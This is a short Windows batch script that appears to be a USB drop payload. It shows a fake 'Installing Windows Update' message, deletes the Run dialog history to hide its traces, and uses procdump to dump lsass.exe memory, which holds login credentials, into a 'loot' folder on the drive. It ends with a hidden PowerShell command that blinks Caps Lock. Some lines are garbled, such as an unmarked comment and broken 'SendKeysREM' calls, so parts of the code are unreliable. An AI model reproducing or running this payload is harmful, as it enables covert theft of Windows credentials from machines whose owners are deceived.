@echo off
@echo Installing Windows Update

REM Delete registry keys storing Run dialog history
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f

REM Creates directory compromised of computer name, date and time
REM %~d0 = path to this batch file. %COMPUTERNAME%, %date% and %time% 
set dst=%~d0\loot\1PumpDump\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
mkdir %dst% >>nul


%~d0\procdump.exe -accepteula -ma lsass.exe %dst%\lsass.dmp 



Blink CAPSLOCK key
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeysREM ('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeysREM ('{CAPSLOCK}')"

@cls
@exit